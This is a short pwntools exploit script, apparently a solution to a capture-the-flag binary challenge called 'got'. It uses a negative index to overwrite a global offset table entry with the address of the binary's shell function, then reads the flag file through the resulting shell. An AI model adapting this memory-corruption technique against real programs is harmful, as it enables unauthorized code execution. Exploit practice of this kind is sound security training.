#!/usr/bin/env python3

from pwn import *

TARGET = './got'
context.arch = 'amd64'
elf = ELF(TARGET)
p = process(TARGET)

# gdb_script = f"""
# #   b *main+243
#   c
# """
# context.terminal = [
#   'wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc'
# ]
# p = gdb.debug(TARGET, gdbscript=gdb_script)

# EXPLOIT #
offset = str(-4).encode()
shell = elf.symbols['shell']
exit_got = elf.got['_exit']

print(f"shell   : {hex(shell)}")
print(f"exit@got: {hex(exit_got)}")

# pause()
payload = p64(0xdeadbeef) + b'\x00' + p64(shell)
p.send(offset)
p.send(payload)
p.sendline(b'cat flag.txt')

p.interactive()
